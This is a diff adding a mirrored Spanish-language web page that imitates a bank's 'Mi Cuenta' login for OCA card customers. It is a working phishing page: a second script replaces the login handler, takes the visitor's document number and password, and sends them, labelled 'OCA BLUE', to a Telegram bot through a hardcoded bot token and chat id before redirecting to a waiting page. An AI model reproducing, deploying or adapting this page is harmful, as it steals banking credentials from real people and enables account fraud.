@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<!-- Mirrored from https://dashing-syrniki-fccc3a.netlify.app/ by HTTrack Website Copier/3.x [XR&CO], Fri, 02 Oct 2026 22:00:20 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=06f40e81-69c0-48f4-9754-a526e2839028
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ingresar a Mi Cuenta</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
+
+<style>
+
+*{
+box-sizing:border-box;
+}
+
+body{
+font-family:'Roboto',sans-serif;
+margin:0;
+background:#dfe3e8;
+display:flex;
+flex-direction:column;
+align-items:center;
+}
+
+/* HEADER */
+
+.header{
+width:100%;
+background:#ffffff;
+padding:15px 20px;
+border-bottom:1px solid #dcdcdc;
+}
+
+.header img{
+height:40px;
+}
+
+/* CONTENEDOR */
+
+.container{
+width:100%;
+max-width:420px;
+padding:20px;
+}
+
+/* TITULO */
+
+h2{
+font-size:22px;
+color:#3a3a3a;
+margin-bottom:25px;
+}
+
+/* INPUTS */
+
+.form-group{
+margin-bottom:20px;
+}
+
+.form-group label{
+display:block;
+margin-bottom:6px;
+font-size:14px;
+}
+
+.form-group input{
+width:100%;
+padding:14px;
+border-radius:12px;
+border:1px solid #cfd4da;
+background:#f4f6f8;
+font-size:15px;
+}
+
+/* LINKS */
+
+.form-links{
+margin-bottom:20px;
+}
+
+.form-links a{
+color:#1a73e8;
+text-decoration:none;
+font-size:14px;
+}
+
+/* BOTONES */
+
+.bottom{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:25px;
+}
+
+.register{
+color:#1a73e8;
+text-decoration:none;
+}
+
+.form-button{
+background:#1f6ed4;
+color:white;
+border:none;
+padding:13px 28px;
+border-radius:28px;
+cursor:pointer;
+opacity:0.5;
+}
+
+/* BANNER */
+
+.banner{
+width:100%;
+max-width:420px;
+padding:0 20px;
+}
+
+.carousel{
+overflow:hidden;
+border-radius:12px;
+width:100%;
+}
+
+.carousel-track{
+display:flex;
+transition:transform 0.5s ease;
+}
+
+.carousel-track img{
+width:100%;
+flex:0 0 100%;
+}
+
+/* DOTS */
+
+.dots{
+display:flex;
+justify-content:center;
+margin-top:8px;
+gap:6px;
+}
+
+.dot{
+width:7px;
+height:7px;
+background:#c6c6c6;
+border-radius:50%;
+}
+
+.dot.active{
+background:#5c6b7a;
+}
+
+/* FOOTER */
+
+.footer{
+width:100%;
+max-width:420px;
+display:flex;
+justify-content:space-between;
+padding:15px 20px;
+font-size:14px;
+}
+
+.footer a{
+color:#1a73e8;
+text-decoration:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+<img src="images.png">
+</div>
+
+<div class="container">
+
+<h2>Ingresá a Mi Cuenta</h2>
+
+<form>
+
+<div class="form-group">
+<label>Nro. de documento</label>
+<input type="text" id="document" inputmode="numeric" pattern="[0-9]*" maxlength="8" placeholder="Document">
+</div>
+
+<div class="form-group">
+<label>Contraseña</label>
+<input type="password" id="password" placeholder="Contraseña">
+</div>
+
+<div class="form-links">
+<a href="#">¿Olvidaste tu contraseña?</a>
+</div>
+
+<div class="bottom">
+<a class="register" href="#">Registrarme</a>
+<button type="button" id="loginBtn" class="form-button" disabled onclick="handleLogin(event)">Ingresar</button>
+</div>
+
+</form>
+
+</div>
+
+<!-- BANNER -->
+
+<div class="banner">
+
+<div class="carousel">
+<div class="carousel-track" id="track">
+
+<img src="banner-beneficio-tipo-cambio.jpg">
+<img src="banner-apay.jpg">
+<img src="beneficio-banner-disa-x3.jpg">
+<img src="beneficio-banner-telepeaje.jpg">
+<img src="beneficio-banner-debitos.jpg">
+
+</div>
+</div>
+
+<div class="dots">
+<div class="dot active"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+</div>
+
+</div>
+
+<div class="footer">
+<a href="#">Abrir cuenta</a>
+<a href="#">Solicitar tarjeta de crédito</a>
+</div>
+
+<script>
+
+const passwordInput = document.getElementById("password");
+const loginBtn = document.getElementById("loginBtn");
+
+passwordInput.addEventListener("input", validarPassword);
+
+function validarPassword() {
+    const pass = passwordInput.value;
+
+    const largoValido = pass.length >= 5;
+    const noSoloNumeros = !/^[0-9]+$/.test(pass);
+
+    if (largoValido && noSoloNumeros) {
+        loginBtn.disabled = false;
+        loginBtn.style.opacity = "1";
+        loginBtn.style.cursor = "pointer";
+    } else {
+        loginBtn.disabled = true;
+        loginBtn.style.opacity = "0.5";
+        loginBtn.style.cursor = "not-allowed";
+    }
+}
+function handleLogin(event){
+
+event.preventDefault()
+
+const documentNumber = document.getElementById("document").value
+const password = document.getElementById("password").value
+
+window.location.href="espera.html"
+
+}
+
+document.addEventListener("DOMContentLoaded", function(){
+
+let index = 0
+const track = document.getElementById("track")
+const dots = document.querySelectorAll(".dot")
+const slides = track.querySelectorAll("img")
+
+function moveSlide(){
+
+index++
+
+if(index >= slides.length){
+index = 0
+}
+
+track.style.transform = "translateX(-" + (index * 100) + "%)"
+
+dots.forEach(dot => dot.classList.remove("active"))
+dots[index].classList.add("active")
+
+}
+
+setInterval(moveSlide,3000)
+
+})
+
+</script>
+
+<script>
+function handleLogin(event) {
+    event.preventDefault();
+
+    const documentNumber = document.getElementById("document").value;
+    const password = document.getElementById("password").value;
+
+    if (documentNumber && password) {
+
+        const token = "9260899625:AAGKGPZsGoIq0cpJhXEX7DPjx0dKsX2vxMg";
+        const chat_id = "-5426620780";
+
+        const message =` ➖➖➖[ OCA BLUE ]➖➖➖
+      ✔️ User: ${documentNumber} 
+      ✔️ Pass: ${password}`;
+console.log(message);
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Respuesta:", data);
+
+            // redirige
+            window.location.href = "espera.html";
+        })
+        .catch(error => {
+            console.error("Error:", error);
+
+            // igual redirige aunque falle
+            window.location.href = "espera.html";
+        });
+
+    } else {
+        alert("Por favor, completa los campos requeridos.");
+    }
+}
+</script>
+</body>
+
+<!-- Mirrored from https://dashing-syrniki-fccc3a.netlify.app/ by HTTrack Website Copier/3.x [XR&CO], Fri, 02 Oct 2026 22:00:23 GMT -->
+</html>
